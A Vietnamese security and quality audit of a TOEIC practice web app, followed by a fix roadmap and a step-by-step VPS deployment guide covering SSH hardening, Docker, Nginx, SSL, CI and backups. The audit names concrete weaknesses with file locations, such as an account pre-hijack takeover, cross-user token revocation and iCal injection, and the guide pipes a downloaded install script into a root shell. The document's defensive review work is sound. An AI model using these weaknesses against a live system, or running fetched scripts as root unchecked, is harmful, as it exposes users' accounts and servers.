| Access token không thể vô hiệu hóa — `jti` sinh ra nhưng không lưu, không blacklist | `TokenService.cs:28` |
| `/api/auth/logout` — ✅ đã thêm `[Authorize]` (2026-08-04); **vẫn chưa** kiểm quyền sở hữu token → user A gửi refresh token của user B vẫn thu hồi được | `AuthController.cs:46-52` |
| Login không kiểm `EmailConfirmed` + Google login gộp tài khoản chỉ bằng email → **pre-hijack account takeover** 🔬 | `AuthService.cs:59-71, 178` |
| Lỗi verify Google trả nguyên `ex.Message` ra client | `AuthService.cs:172-176` |
| Token xác thực email và reset mật khẩu **in ra stdout** | `AuthService.cs:53-54, 124-125` |
| DTO auth **không có validation nào** — null/rỗng đi thẳng vào Identity gây 500 | `DTOs/Auth/*.cs` |
| Rate limit chỉ theo IP, chưa đọc `X-Forwarded-For`, và chỉ áp cho `AuthController` | `Program.cs:149-165` |
| Thiếu `UseHsts`, security headers, `AllowedHosts = "*"` | `Program.cs:211-216` |
| iCal injection — `RegisterUrl` không escape khi sinh file `.ics` (endpoint ẩn danh) | `ExamScheduleService.cs:144-145` |

## 3.4 · Chất lượng & quy trình

| Vấn đề | Ghi chú |
|---|---|
| **0 test cho exam engine** | 30 test hiện có chỉ phủ `ToeicScoreHelper` + `PartBreakdownBuilder`. `TestSessionService` — phần phức tạp nhất, đã từng có bug — không có test nào. `UnitTest1.cs` rỗng |
| **Không có CI** | `.github/workflows/` rỗng → 30 test không bao giờ chạy tự động |
| Mọi lỗi nghiệp vụ trả 400 | Không phân biệt 401/403/404 → lộ sự tồn tại của tài nguyên người khác |
| `AddHttpContextAccessor()` gọi hai lần | `Program.cs:92` và `:169` |
| Không có health check, không auto-migrate | DB chưa migrate → app crash lúc startup, không có endpoint chẩn đoán |
| Code chết | `IApplicationDbContext` (không đăng ký DI), `ListAllAsync`, trạng thái `Abandoned`, `package.json` ở thư mục gốc |
| Frontend: không có route 404 | URL sai → trang trắng hoàn toàn |
| Frontend: chỉ 1/8 trang CM xử lý lỗi 403 | Các trang còn lại nuốt lỗi phân quyền |
| **Doc lệch code** | `02-cong-nghe.md:72` ghi SQL Server ở `localhost:1433` (thực tế `1434`); `06-database.md` thiếu hẳn bảng `RefreshTokens` |

---

# 4. Lộ trình sửa

> Chia 4 giai đoạn. **Không nhảy cóc** — giai đoạn 1 là điều kiện để có thể deploy.

## Giai đoạn 1 — Chặn deploy (~1–2 ngày)

```
✅ 1. Fallback authorization policy + [AllowAnonymous] cho endpoint công khai   — XONG 2026-08-04
□ 2. Đổi TOÀN BỘ secret; gỡ appsettings.Development.json khỏi git; User Secrets
□ 3. Đưa cấu trúc Jwt/Redis/Cors vào appsettings.json; bỏ `!`, fail fast có thông báo
□ 4. Sanitize HTML ở backend (HtmlSanitizer) cho Content/Explanation/Passage
□ 5. Bảo vệ Hangfire Dashboard bằng IDashboardAuthorizationFilter
□ 6. Redis connect qua factory lambda + abortConnect=false
□ 7. docker-compose.prod.yml: MSSQL_PID=Express, bỏ ports, bỏ hardcode password
□ 8. Tách file media cần bảo vệ ra khỏi wwwroot (hoặc chấp nhận và ghi rõ là public)
```

## Giai đoạn 2 — Trải nghiệm người dùng (~2–3 ngày)

```
□ 1. Auto-refresh token trong axios interceptor (kèm chống refresh race)      ← quan trọng nhất
□ 2. Khôi phục phiên thi khi F5 (sessionStorage + endpoint lấy phiên InProgress)
□ 3. Ràng buộc thời gian làm bài phía server
□ 4. Frontend biết role: backend trả roles → Sidebar lọc menu → RequireRole
□ 5. Logout gọi API thật
□ 6. Bật lockout khi sai mật khẩu (SignInManager)
□ 7. Validate import Excel dùng chung Validate()
□ 8. Sửa múi giờ cron + thứ tự commit/gửi mail
```

## Giai đoạn 3 — Deploy (~1–2 ngày)

Xem [Phần 5](#5-hướng-dẫn-deploy-thực-chiến).

## Giai đoạn 4 — Chất lượng & hiệu năng (làm dần)

```
□ 1. CI GitHub Actions: build + test               ← rẻ nhất, giá trị cao nhất
□ 2. Test cho TestSessionService (chấm điểm, partial test, GetDetail)
□ 3. AsNoTracking mặc định + truyền CancellationToken
□ 4. Sửa /stats/parts thành một query GroupBy dưới SQL
□ 5. Cache Redis cho dashboard — Redis mới thật sự có việc để làm
□ 6. Concurrency token (RowVersion) cho TestSession
□ 7. Phân trang dưới SQL
```

---

# 5. Hướng dẫn deploy thực chiến

## 5.1 · Mua VPS

**Cấu hình: 4GB RAM / 2 vCPU / ≥40GB SSD.**

| Thành phần | RAM |
|---|---|
| SQL Server Express | ~1,5–2 GB |
| API ASP.NET Core | ~300–400 MB |
| Redis (cap 256MB) | 256 MB |
| Nginx | ~30 MB |
| Ubuntu + Docker | ~400–500 MB |
| **Tổng** | **~2,5–3,2 GB** |

⚠️ **2GB không đủ** — riêng SQL Server đã cần 2GB, máy sẽ swap liên tục.
⚠️ **8GB gần như không giúp gì cho DB** — SQL Server Express bị chặn cứng ở ~1,4GB buffer pool và 4 core.
**4GB là điểm ngọt.**

| Nơi đặt | Giá tham khảo | Độ trễ tới VN |
|---|---|---|
| VPS Việt Nam (AZDIGI, Vietnix, Tino) | ~250–400k/tháng | thấp nhất (~5–20ms) |
| Singapore (Vultr/DigitalOcean/Linode) | ~$20–24/tháng | ~30–50ms |
| Hetzner (Đức) | ~€4.5/tháng | ~250–300ms ❌ xa |

💡 Kiểm tra [GitHub Student Pack](https://education.github.com/pack) — thường kèm credit DigitalOcean/Azure.

**Vì sao chọn VPS chứ không phải PaaS (Azure App Service):** dự án lưu media thẳng vào `wwwroot`
([MediaController.cs:57](../backend/ToeicMasterPro.API/Controllers/MediaController.cs#L57)). Trên App
Service filesystem không bền → **phải viết lại toàn bộ sang Blob Storage trước khi deploy được**. VPS
chỉ cần mount một volume. Ngoài ra Hangfire cần process chạy liên tục, và Redis managed đắt hơn cả con VPS.

## 5.2 · Bảo mật máy chủ — làm TRƯỚC khi cài gì khác

```bash
# 1. Tạo user thường, không dùng root
adduser toeic && usermod -aG sudo toeic

# 2. Đăng nhập bằng SSH key, TẮT mật khẩu
#    Trên máy bạn: ssh-copy-id toeic@<ip>
#    Trên VPS, sửa /etc/ssh/sshd_config:
#      PermitRootLogin no
#      PasswordAuthentication no
sudo systemctl restart sshd

# 3. Firewall — chỉ mở 3 cổng
sudo ufw allow 22 && sudo ufw allow 80 && sudo ufw allow 443
sudo ufw enable

# 4. Cài Docker
curl -fsSL https://get.docker.com | sudo sh
sudo usermod -aG docker toeic
```

> ⚠️ **Đừng bỏ qua bước tắt đăng nhập mật khẩu.** VPS mới dựng bị bot dò mật khẩu SSH trong vòng vài phút.

## 5.3 · Mua tên miền & trỏ DNS

**Mua ở:** Namecheap, Cloudflare Registrar (bán đúng giá gốc), hoặc nhà cung cấp VN nếu muốn `.vn`.

**Tạo tối thiểu 2 bản ghi:**
```
A     @      <IP-VPS>
A     www    <IP-VPS>        (hoặc CNAME www → @)
```

Kiểm tra: `nslookup ten-mien.com` hoặc dnschecker.org. Propagation mất vài phút tới vài giờ.

💡 **Nên trỏ qua Cloudflare** (gói miễn phí): được CDN, chống DDoS cơ bản, và **giấu IP thật của VPS**.

## 5.4 · Viết Dockerfile

**`backend/Dockerfile`** — multi-stage:
```dockerfile
FROM mcr.microsoft.com/dotnet/sdk:8.0 AS build
WORKDIR /src
COPY *.sln .
COPY backend/ToeicMasterPro.Domain/*.csproj         backend/ToeicMasterPro.Domain/
COPY backend/ToeicMasterPro.Application/*.csproj    backend/ToeicMasterPro.Application/
COPY backend/ToeicMasterPro.Infrastructure/*.csproj backend/ToeicMasterPro.Infrastructure/
COPY backend/ToeicMasterPro.API/*.csproj            backend/ToeicMasterPro.API/
COPY backend/ToeicMasterPro.Tests/*.csproj          backend/ToeicMasterPro.Tests/
RUN dotnet restore                                   # ← layer này được cache
COPY . .
RUN dotnet publish backend/ToeicMasterPro.API -c Release -o /app/publish --no-restore

FROM mcr.microsoft.com/dotnet/aspnet:8.0
WORKDIR /app
COPY --from=build /app/publish .
EXPOSE 8080
ENTRYPOINT ["dotnet", "ToeicMasterPro.API.dll"]
```

**`frontend/Dockerfile`** — build ra file tĩnh, Nginx phục vụ:
```dockerfile
FROM node:22-alpine AS build
WORKDIR /app
COPY frontend/package*.json ./
RUN npm ci
COPY frontend/ .
RUN npm run build

FROM nginx:alpine
COPY --from=build /app/dist /usr/share/nginx/html
COPY frontend/nginx.conf /etc/nginx/conf.d/default.conf
```

## 5.5 · `docker-compose.prod.yml`

```yaml
services:
  sqlserver:
    image: mcr.microsoft.com/mssql/server:2022-latest
    environment:
      - ACCEPT_EULA=Y
      - SA_PASSWORD=${DB_PASSWORD}          # ← KHÔNG có fallback
      - MSSQL_PID=Express                   # ← BẮT BUỘC đổi, Developer cấm dùng prod
    volumes: [sqlserver_data:/var/opt/mssql]
    restart: unless-stopped
    # ← KHÔNG có mục ports: chỉ nói chuyện trong mạng nội bộ Docker

  redis:
    image: redis:7.4-alpine
    command: ["redis-server","--requirepass","${REDIS_PASSWORD}","--appendonly","yes",
              "--maxmemory","256mb","--maxmemory-policy","allkeys-lru"]
    volumes: [redis_data:/data]
    restart: unless-stopped
    # ← cũng KHÔNG expose ports

  api:
    build: { context: ., dockerfile: backend/Dockerfile }
    environment:
      - ASPNETCORE_ENVIRONMENT=Production
      - ConnectionStrings__DefaultConnection=Server=sqlserver;Database=ToeicMasterPro;User Id=sa;Password=${DB_PASSWORD};TrustServerCertificate=True
      - Redis__ConnectionStrings=redis:6379,password=${REDIS_PASSWORD},abortConnect=false
      - Jwt__SecretKey=${JWT_SECRET}
      - Jwt__Issuer=https://toeicmaster.com
      - Jwt__Audience=https://toeicmaster.com
      - Cors__AllowedOrigins__0=https://toeicmaster.com
    volumes: [media:/app/wwwroot/uploads]   # ← media phải nằm ngoài container
    depends_on: [sqlserver, redis]
    restart: unless-stopped

  frontend:
    build: { context: ., dockerfile: frontend/Dockerfile }
    ports: ["80:80", "443:443"]
    depends_on: [api]
    restart: unless-stopped

volumes: { sqlserver_data: , redis_data: , media: }
```

**Ba điểm quan trọng:**
1. **Không có `ports`** cho SQL Server và Redis — chỉ `frontend` mở ra Internet
2. Container gọi nhau bằng **tên service** (`Server=sqlserver`, `redis:6379`), không phải `localhost`
3. **`media` volume bắt buộc** — không có nó thì mọi file audio/ảnh đã upload **mất sạch** mỗi lần deploy lại

Tạo file `.env` trên VPS (không commit) chứa `DB_PASSWORD`, `REDIS_PASSWORD`, `JWT_SECRET`.

## 5.6 · Nginx

```nginx
server {
    listen 443 ssl http2;
    server_name toeicmaster.com;

    ssl_certificate     /etc/letsencrypt/live/toeicmaster.com/fullchain.pem;
    ssl_certificate_key /etc/letsencrypt/live/toeicmaster.com/privkey.pem;

    location / {
        root /usr/share/nginx/html;
        try_files $uri $uri/ /index.html;      # ← BẮT BUỘC cho SPA
    }

    location /api/ {
        proxy_pass http://api:8080;
        proxy_set_header Host              $host;
        proxy_set_header X-Real-IP         $remote_addr;
        proxy_set_header X-Forwarded-For   $proxy_add_x_forwarded_for;
        proxy_set_header X-Forwarded-Proto $scheme;
    }

    client_max_body_size 200M;                 # CM upload ZIP audio đề thi

    # Audio đề thi — cho phép tua (seek) và cache
    location /uploads/ {
        proxy_pass http://api:8080;
        add_header Accept-Ranges bytes;
        expires 7d;
    }
}
server {                                        # ép HTTP → HTTPS
    listen 80;
    server_name toeicmaster.com www.toeicmaster.com;
    return 301 https://$host$request_uri;
}
```

**Kèm theo, phải bật ở phía .NET** — nếu không, rate limit theo IP sai hoàn toàn vì mọi request đều
mang IP của Nginx:
```csharp
app.UseForwardedHeaders(new ForwardedHeadersOptions {
    ForwardedHeaders = ForwardedHeaders.XForwardedFor | ForwardedHeaders.XForwardedProto
});
```

## 5.7 · SSL

```bash
sudo apt install certbot python3-certbot-nginx
sudo certbot --nginx -d toeicmaster.com -d www.toeicmaster.com
sudo certbot renew --dry-run          # kiểm tra gia hạn tự động
```

Chứng chỉ Let's Encrypt hạn **90 ngày**, Certbot tự cài cron gia hạn.

## 5.8 · Migration lên DB production

```bash
# Cách an toàn nhất: sinh script, đọc, rồi chạy
dotnet ef migrations script --idempotent \
  --project backend/ToeicMasterPro.Infrastructure \
  --startup-project backend/ToeicMasterPro.API \
  -o migrate.sql
# Đọc migrate.sql rồi chạy bằng sqlcmd
```

`--idempotent` sinh script có kiểm tra "migration này đã chạy chưa" → chạy nhiều lần cũng an toàn.

## 5.9 · CI với GitHub Actions

`.github/workflows/ci.yml`:
```yaml
name: CI
on: [push, pull_request]
jobs:
  backend:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - uses: actions/setup-dotnet@v4
        with: { dotnet-version: '8.0.x' }
      - run: dotnet restore
      - run: dotnet build --no-restore
      - run: dotnet test --no-build --verbosity normal
  frontend:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - uses: actions/setup-node@v4
        with: { node-version: '22', cache: 'npm', cache-dependency-path: frontend/package-lock.json }
      - run: npm ci
        working-directory: frontend
      - run: npm run build
        working-directory: frontend
```

Đây là **thứ rẻ nhất, giá trị cao nhất** trong toàn bộ danh sách. 30 test đang nằm không.

## 5.10 · Checklist deploy

```
□ 1.  VPS 4GB Ubuntu 22.04, đã bảo mật SSH + ufw
□ 2.  Docker + Docker Compose
□ 3.  Tên miền, bản ghi A trỏ về IP
□ 4.  ✅ ĐÃ SỬA XONG toàn bộ Giai đoạn 1 (8 vấn đề chặn deploy)
□ 5.  Dockerfile API + frontend
□ 6.  docker-compose.prod.yml + file .env trên VPS
□ 7.  Nginx + Certbot, SSL chạy được
□ 8.  Migration lên DB production
□ 9.  docker compose up -d, kiểm tra logs
□ 10. Smoke test: đăng ký → đăng nhập → thi thử → nộp bài → xem kết quả
□ 11. ⭐ THI MỘT ĐỀ ĐẦY ĐỦ TRÊN ĐIỆN THOẠI, DÙNG 4G
□ 12. Backup DB tự động (cron dump + đẩy sang nơi khác)
□ 13. CI GitHub Actions
```

> ⭐ **Bước 11 là bước quan trọng nhất và chưa ai làm.** Bốn thứ dễ vỡ:
>
> 1. **Access token hết hạn giữa bài thi** — nếu chưa sửa mục 2.1 thì bạn sẽ bị đá ra ở phút 61 và
>    thấy tận mắt vì sao nó nghiêm trọng
> 2. **Audio Part 3/4 trên iOS Safari** — Safari chặn autoplay, bắt buộc phải có thao tác chạm
> 3. **Tải audio qua 4G** — file 30–50MB, chậm giữa bài thi là hỏng cả lần thi
> 4. **Reading Part 7 trên màn hình hẹp** — passage dài + 5 câu hỏi trên màn 6 inch
>
> Phát hiện bốn lỗi này ở tuần 6 dễ sửa hơn tuần 12 rất nhiều.

## 5.11 · Sau khi deploy — vận hành

```bash
# Backup DB hằng ngày (thêm vào crontab)
0 3 * * * docker exec toeic_sqlserver /opt/mssql-tools18/bin/sqlcmd \
  -S localhost -U sa -P "$DB_PASSWORD" -C \
  -Q "BACKUP DATABASE ToeicMasterPro TO DISK='/var/opt/mssql/backup/db.bak' WITH INIT"
```

> ⚠️ **Backup nằm cùng máy với DB thì không phải backup.** Phải đẩy sang nơi khác (rsync sang máy
> khác, hoặc upload lên object storage). Và **phải thử phục hồi ít nhất một lần** — backup chưa từng
> được restore là backup chưa được chứng minh.

**Nên có thêm:**
- Endpoint `/health` để giám sát biết app còn sống (dự án hiện **chưa có**)
- Uptime monitor miễn phí (UptimeRobot) ping mỗi 5 phút
- Xem log: `docker compose logs -f api`
